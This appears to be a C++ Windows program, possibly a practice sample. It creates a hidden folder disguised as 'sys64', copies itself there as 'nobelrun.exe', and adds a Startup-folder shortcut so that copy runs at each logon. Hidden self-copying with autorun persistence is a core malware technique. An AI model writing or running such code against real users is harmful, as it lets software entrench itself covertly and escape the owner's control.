#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>

// Create the hidden folder
void MakeHiddenFolder(const char* path) {
    CreateDirectoryA(path, NULL);
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
}

// Copy any file into the target folder
bool CopyFileToTarget(const char* source, const char* destFolder) {
    char dest[MAX_PATH];
    // pick just the filename portion
    const char* fileName = strrchr(source, '\\') ? strrchr(source, '\\') + 1 : source;
    snprintf(dest, MAX_PATH, "%s\\%s", destFolder, fileName);
    return CopyFileA(source, dest, FALSE);
}

// Copy the running EXE under a new name
bool CopyAndRenameExe(const char* destFolder, const char* newName) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    char destPath[MAX_PATH];
    snprintf(destPath, MAX_PATH, "%s\\%s", destFolder, newName);

    return CopyFileA(exePath, destPath, FALSE);
}

// Create a .lnk in the Startup folder pointing at targetPath
bool CreateShortcutToStartup(const char* targetPath, const char* shortcutName) {
    char startupPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

    char linkPath[MAX_PATH];
    snprintf(linkPath, MAX_PATH, "%s\\%s.lnk", startupPath, shortcutName);

    CoInitialize(NULL);

    IShellLinkA* psl = nullptr;
    HRESULT hr = CoCreateInstance(
        CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
        IID_IShellLinkA, (LPVOID*)&psl
    );
    if (FAILED(hr) || !psl) return false;

    psl->SetPath(targetPath);
    psl->SetDescription("Auto run");

    IPersistFile* ppf = nullptr;
    hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
    if (SUCCEEDED(hr) && ppf) {
        WCHAR wsz[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, linkPath, -1, wsz, MAX_PATH);
        ppf->Save(wsz, TRUE);
        ppf->Release();
    }

    psl->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}

int main() {
    const char* folder = "C:\\fake\\LINA\\Desktop\\games\\sys64";
    MakeHiddenFolder(folder);

    // ONLY copy the text files here:
    const int numTextFiles = 3;
    const char* textFiles[numTextFiles] = {
        "hello.txt",
        "hello2.txt",
        "hello3.txt"
    };
    for (int i = 0; i < numTextFiles; ++i) {
        if (!CopyFileToTarget(textFiles[i], folder)) {
            std::cerr << "Failed to copy " << textFiles[i] << "\n";
        }
    }

    // Copy & rename the running EXE into sys64:
    const char* newExeName = "nobelrun.exe";
    if (!CopyAndRenameExe(folder, newExeName)) {
        std::cerr << "Failed to copy and rename EXE.\n";
        return 1;
    }

    // Create a startup shortcut
    char fullPath[MAX_PATH];
    snprintf(fullPath, MAX_PATH, "%s\\%s", folder, newExeName);
    if (!CreateShortcutToStartup(fullPath, "nobelrunner")) {
        std::cerr << "Failed to create startup shortcut.\n";
        return 1;
    }

    std::cout << "Done.\n";
    return 0;
}
